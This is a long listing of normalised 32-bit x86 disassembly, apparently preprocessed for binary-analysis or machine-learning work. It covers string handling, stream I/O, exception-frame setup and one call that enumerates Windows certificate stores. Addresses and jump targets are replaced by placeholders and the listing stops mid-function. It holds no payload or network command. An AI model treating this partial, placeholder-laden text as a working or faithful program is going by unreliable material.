mov eax r--data
lea ecx [ ebp - 0x1b0 ]
mov [ ebp - 0x1b4 ] sub_4148e0
mov [ ebp - 0x19c ] ebx
mov [ ebp - 0x1a0 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x5
xor edx edx
push 0x15
mov eax r--data
lea ecx [ ebp - 0x194 ]
mov [ ebp - 0x180 ] ebx
mov [ ebp - 0x184 ] esi
mov [ ebp - 0x194 ] dx
call sub_401c90
lea eax [ ebp - 0x1b4 ]
mov [ ebp - 0x4 ] 0x6
call sub_4173f0
mov [ ebp - 0x13c ] sub_414450
xor eax eax
mov [ ebp - 0x138 ] ax
push 0x8
mov eax r--data
lea ecx [ ebp - 0x138 ]
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x128 ] esi
call sub_401c90
mov [ ebp - 0x4 ] bl
xor ecx ecx
mov [ ebp - 0x11c ] cx
push 0x1c
mov eax r--data
lea ecx [ ebp - 0x11c ]
mov [ ebp - 0x108 ] ebx
mov [ ebp - 0x10c ] esi
call sub_401c90
lea eax [ ebp - 0x13c ]
mov [ ebp - 0x4 ] 0x8
call sub_4173f0
xor edx edx
push 0x12
mov eax r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x88 ] sub_414a50
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x9
xor eax eax
mov [ ebp - 0x68 ] ax
push 0x17
mov eax r--data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
call sub_401c90
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0xa
call sub_4173f0
xor ecx ecx
mov [ ebp - 0x48 ] cx
push 0xa
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4c ] sub_414470
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0xb
xor edx edx
push 0x10
mov eax r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] dx
call sub_401c90
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xc
call sub_4173f0
xor eax eax
mov [ ebp - 0xfc ] ax
push 0x8
mov eax r--data
lea ecx [ ebp - 0xfc ]
mov [ ebp - 0x100 ] sub_417020
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xec ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0xd
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
xor ecx ecx
mov [ ebp - 0xe0 ] cx
push 0x61
mov eax r--data
lea ecx [ ebp - 0xe0 ]
call sub_401c90
lea eax [ ebp - 0x100 ]
mov [ ebp - 0x4 ] 0xe
call sub_4173f0
xor edx edx
push 0x9
mov eax r--data
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0xc4 ] sub_416990
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
mov [ ebp - 0xc0 ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0xf
xor eax eax
mov [ ebp - 0xa4 ] ax
push 0x4f
mov eax r--data
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
call sub_401c90
lea eax [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x10
call sub_4173f0
cmp [ ebp - 0x90 ] 0x8
jb r-xdata
xor edx edx
cmp [ ebp - 0xac ] 0x8
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
mov [ ebp - 0xa4 ] dx
jb r-xdata
mov ecx [ ebp - 0xa4 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0xcc ] 0x8
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
mov [ ebp - 0xc0 ] cx
jb r-xdata
mov eax [ ebp - 0xc0 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0xe8 ] 0x8
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
mov [ ebp - 0xe0 ] ax
jb r-xdata
mov edx [ ebp - 0xe0 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x18 ] 0x8
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xec ] esi
mov [ ebp - 0xfc ] dx
jb r-xdata
mov ecx [ ebp - 0xfc ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] cx
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x54 ] 0x8
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] ax
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x70 ] 0x8
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] dx
jb r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x108 ] 0x8
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] cx
jb r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x124 ] 0x8
mov [ ebp - 0x108 ] ebx
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x11c ] ax
jb r-xdata
mov edx [ ebp - 0x11c ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x180 ] 0x8
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x128 ] esi
mov [ ebp - 0x138 ] dx
jb r-xdata
mov ecx [ ebp - 0x138 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x19c ] 0x8
mov [ ebp - 0x180 ] ebx
mov [ ebp - 0x184 ] esi
mov [ ebp - 0x194 ] cx
jb r-xdata
mov eax [ ebp - 0x194 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x144 ] 0x8
mov [ ebp - 0x19c ] ebx
mov [ ebp - 0x1a0 ] esi
mov [ ebp - 0x1b0 ] ax
jb r-xdata
mov edx [ ebp - 0x1b0 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x160 ] 0x8
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x148 ] esi
mov [ ebp - 0x158 ] dx
jb r-xdata
mov ecx [ ebp - 0x158 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x1bc ] 0x8
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x164 ] esi
mov [ ebp - 0x174 ] cx
jb r-xdata
mov eax [ ebp - 0x174 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x1d8 ] 0x8
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x1c0 ] esi
mov [ ebp - 0x1d0 ] ax
jb r-xdata
mov edx [ ebp - 0x1d0 ]
push edx
call sub_43811c
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x1ec ]
push ecx
call sub_43811c
add esp 0x4
sub_413f70
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4537c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
push 0x10
call sub_438178
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
mov [ esp + 0x14 ] ebx
mov edi ebx
mov edi eax
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ esp + 0x14 ] edi
jmp r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0xc ]
test cl 0x6
jne r-xdata
push edi
call sub_402ff0
add esp 0x4
test al al
je r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
push 0x0
lea eax [ esp + 0x1c ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x70 ] 0x0
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ebx [ edi ]
cmp ebx [ edi + 0x4 ]
je r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push ebx
push ecx
push 0x9
push rw-data
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov [ esp + 0x60 ] 0xffffffff
cmp [ esp + 0x2c ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
test edi edi
je r-xdata
push 0xa
mov ecx rw-data
call sub_408340
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x18 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov al 0x1
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x40 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov esi [ edi ]
test esi esi
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
test esi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x14 ]
add ebx 0x1c
cmp ebx [ edx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
xor eax eax
push edi
mov [ edi ] eax
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] eax
call sub_43811c
add esp 0x4
mov ebx [ edi + 0x4 ]
cmp esi ebx
je r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
cmp eax ecx
je r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
mov edi edx
jmp r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov edx [ edi ]
push edx
call sub_43811c
add esp 0x4
mov edi edi
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov edx [ esp + 0x14 ]
push edx
push ecx
call sub_407250
mov edi eax
mov eax [ esp + 0x1c ]
mov ebx [ eax + 0x4 ]
add esp 0x8
mov esi edi
cmp edi ebx
je r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi ebx
jne r-xdata
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x14 ]
mov [ edx + 0x4 ] edi
mov edi edx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push edi
call sub_404f80
add esp 0x4
test al al
je r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi ebx
jne r-xdata
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
push 0x0
lea eax [ esp + 0x38 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x70 ] 0x1
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ebx [ edi ]
cmp ebx [ edi + 0x4 ]
je r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
push ecx
push 0x9
push rw-data
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
cmp [ esp + 0x48 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x34 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov edx [ esp + 0x14 ]
add ebx 0x1c
cmp ebx [ edx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov edi edx
jmp r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_414450
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp ecx [ eax + 0x4 ]
push 0x0
setne dl
movzx eax dl
push eax
call sub_414bc0
add esp 0x8
mov al 0x1
pop ebp
retn
sub_414470
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp ecx [ eax + 0x4 ]
push 0x1
setne dl
movzx eax dl
push eax
call sub_414bc0
add esp 0x8
mov al 0x1
pop ebp
retn
sub_414490
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_453781
mov eax [ fs : 0x0 ]
push eax
sub esp 0x80
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x78 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x90 ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x8 ]
xor esi esi
mov [ esp + 0x10 ] esi
mov eax [ ecx ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
push esi
xor ecx ecx
push eax
or eax 0xffffffff
lea edi [ esp + 0x20 ]
mov [ esp + 0x34 ] 0x7
mov [ esp + 0x30 ] esi
mov [ esp + 0x20 ] cx
call sub_401be0
mov [ esp + 0x98 ] 0x1
mov ebx 0x2
xor eax eax
mov [ esp + 0x34 ] ax
push 0x1e
mov eax r--data
lea ecx [ esp + 0x38 ]
mov [ esp + 0x4c ] 0x7
mov [ esp + 0x48 ] esi
call sub_401c90
lea edi [ esp + 0x34 ]
mov [ esp + 0x98 ] esi
lea ebx [ esi + 0x1 ]
jmp r-xdata
mov esi 0x7
and ebx 0xfffffffd
cmp [ esp + 0x2c ] 0x8
jb r-xdata
mov [ esp + 0x60 ] esi
xor edx edx
lea esi [ esp + 0x50 ]
mov [ esp + 0x10 ] ebx
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x50 ] dx
call sub_4023e0
mov [ esp + 0x98 ] 0x2
test bl 0x2
je r-xdata
push 0x27
push ecx
lea ecx [ esp + 0x58 ]
push ecx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_40e950
add esp 0x8
lea edx [ esp + 0x14 ]
push edx
sub esp 0x1c
mov edi esp
mov [ edi + 0x14 ] esi
mov [ esp + 0x34 ] esp
xor esi esi
xor eax eax
mov [ edi + 0x10 ] esi
push esi
lea ecx [ esp + 0x74 ]
mov [ edi ] ax
push ecx
or eax 0xffffffff
call sub_401be0
call sub_401050
add esp 0x20
test al al
je r-xdata
cmp [ esp + 0x48 ] 0x8
jb r-xdata
mov esi 0x7
xor ecx ecx
mov [ esp + 0x2c ] esi
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] cx
jmp r-xdata
mov eax [ esp + 0x18 ]
push eax
call sub_43811c
add esp 0x4
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push 0xa
mov ecx rw-data
call sub_408340
mov edx [ rw-data ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + rw-data ]
xor edi edi
test cl 0x6
jne r-xdata
xor eax eax
mov [ esp + 0x48 ] esi
mov [ esp + 0x44 ] 0x0
mov [ esp + 0x34 ] ax
mov edx [ esp + 0x34 ]
push edx
call sub_43811c
add esp 0x4
mov [ esp + 0x98 ] 0x4
test bl 0x1
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
cmp edi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp [ esp + 0x64 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x10
call sub_438178
add esp 0x4
cmp eax esi
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] esi
jne r-xdata
mov edi 0x4
mov al 0x1
mov ecx [ esp + 0x90 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x78 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov edx [ esp + 0x50 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov edx [ esp + 0x14 ]
push sub_401440
push esi
push 0x0
push edx
mov [ esp + 0x20 ] esi
call [ CertEnumSystemStore@IAT ]
test eax eax
je r-xdata
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
mov esi eax
push esi
push eax
call sub_402d50
or eax 0x4
push 0x0
lea eax [ esp + 0x70 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0xa8 ] 0x5
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ebx [ esi ]
cmp ebx [ esi + 0x4 ]
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
test esi esi
je r-xdata
push ebx
push ecx
push 0x9
push rw-data
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
cmp [ esp + 0x80 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov esi [ esp + 0x10 ]
mov edx [ esp + 0x6c ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
xor eax eax
push esi
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
call sub_43811c
add esp 0x4
jmp r-xdata
mov edi [ esi + 0x4 ]
call sub_402330
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
mov edx [ esp + 0x10 ]
add ebx 0x1c
cmp ebx [ edx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
jmp r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_4148e0
push ebp
mov ebp esp
push 0xffffffff
push sub_453708
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x48 ] ax
mov edi 0x7
xor ebx ebx
push 0x1e
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
call sub_401c90
mov [ ebp - 0x4 ] ebx
xor ecx ecx
mov [ ebp - 0x2c ] cx
push 0x2
mov eax r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
call sub_401c90
mov [ ebp - 0x4 ] 0x1
mov edi [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jne r-xdata
cmp eax 0x2
jne r-xdata
push ebx
push edi
lea edi [ ebp - 0x48 ]
jmp r-xdata
push ebx
sub esp 0x1c
mov edi esp
mov [ ebp - 0x50 ] esp
push ebx
lea eax [ ebp - 0x2c ]
mov esi 0x7
xor edx edx
push eax
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ebx
or eax 0xffffffff
mov [ edi ] dx
call sub_401be0
sub esp 0x1c
mov edi esp
mov [ ebp - 0x4c ] esp
mov [ ebp - 0x4 ] 0x2
push ebx
lea edx [ ebp - 0x48 ]
xor ecx ecx
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ebx
push edx
or eax 0xffffffff
mov [ edi ] cx
call sub_401be0
mov [ ebp - 0x4 ] 0x1
call sub_415c10
mov edi 0x8
add esp 0x3c
cmp [ ebp - 0x18 ] edi
jb r-xdata
push ebx
push edi
or eax 0xffffffff
lea edi [ ebp - 0x48 ]
call sub_401be0
mov eax [ esi + 0x4 ]
add eax 0xffffffe4
push ebx
push eax
lea edi [ ebp - 0x2c ]
or eax 0xffffffff
call sub_401be0
xor ecx ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] cx
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_43811c
add esp 0x4
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x48 ]
push edx
call sub_43811c
add esp 0x4
sub_414a50
push ebp
mov ebp esp
push 0xffffffff
push sub_453708
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x48 ] ax
mov edi 0x7
xor ebx ebx
push 0x1e
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
call sub_401c90
mov [ ebp - 0x4 ] ebx
xor ecx ecx
mov [ ebp - 0x2c ] cx
push 0x2
mov eax r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
call sub_401c90
mov [ ebp - 0x4 ] 0x1
mov edi [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jne r-xdata
cmp eax 0x2
jne r-xdata
push ebx
push edi
lea edi [ ebp - 0x48 ]
jmp r-xdata
push 0x1
sub esp 0x1c
mov edi esp
mov [ ebp - 0x50 ] esp
push ebx
lea eax [ ebp - 0x2c ]
mov esi 0x7
xor edx edx
push eax
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ebx
or eax 0xffffffff
mov [ edi ] dx
call sub_401be0
sub esp 0x1c
mov edi esp
mov [ ebp - 0x4c ] esp
mov [ ebp - 0x4 ] 0x2
push ebx
lea edx [ ebp - 0x48 ]
xor ecx ecx
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ebx
push edx
or eax 0xffffffff
mov [ edi ] cx
call sub_401be0
mov [ ebp - 0x4 ] 0x1
call sub_415c10
mov edi 0x8
add esp 0x3c
cmp [ ebp - 0x18 ] edi
jb r-xdata
push ebx
push edi
or eax 0xffffffff
lea edi [ ebp - 0x48 ]
call sub_401be0
mov eax [ esi + 0x4 ]
add eax 0xffffffe4
push ebx
push eax
lea edi [ ebp - 0x2c ]
or eax 0xffffffff
call sub_401be0
xor ecx ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] cx
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_43811c
add esp 0x4
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x48 ]
push edx
call sub_43811c
add esp 0x4
sub_414bc0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4536be
mov eax [ fs : 0x0 ]
push eax
sub esp 0x148
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x140 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x158 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov [ esp + 0x48 ] ebx
mov eax r--data
cmp [ ebp + 0x8 ] bl
jne r-xdata
xor ecx ecx
mov [ esp + 0x134 ] cx
mov ecx eax
mov [ esp + 0x148 ] 0x7
mov [ esp + 0x144 ] ebx
lea esi [ ecx + 0x2 ]
mov eax r--data
